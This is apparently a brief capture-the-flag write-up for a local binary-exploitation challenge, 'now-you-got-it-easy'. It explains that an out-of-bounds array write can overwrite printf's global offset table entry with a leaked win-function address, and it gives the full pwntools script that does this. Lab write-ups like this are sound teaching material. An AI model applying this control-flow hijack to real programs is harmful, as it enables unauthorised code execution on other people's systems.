![](img/Now%20you%20got%20it-1780480046312.webp)

so we can edit the stack, which include the got (global offset table), which conveniently, contain

![](img/Now%20you%20got%20it-1780479960705.webp)

also we got the win location

now we just need to replace some function address with the win address, which, in this case, i chose printf

```
#!/usr/bin/python3
from pwn import *
import re

context.log_level = 'debug'

p = process("/challenge/now-you-got-it-easy")

out = p.recvuntil(b"Which number would you like to view?").decode()

z = re.search(r'The array starts at\s+(0x[0-9a-f]+)', out)
zz = re.search(r'The GOT \(global offset table\) is located at\s+(0x[0-9a-f]+)', out)
zzz = re.search(r'FREE LEAK: win is located at:\s+(0x[0-9a-f]+)', out)

dist = (int(zz.group(1), 16) - int(z.group(1), 16) + 0x40) // 8
payload = zzz.group(1)

p.sendline(str(dist).encode())
p.recvuntil(b"What number would you like to replace it with?")
p.sendline(str(int(payload, 16)).encode())

p.interactive()
```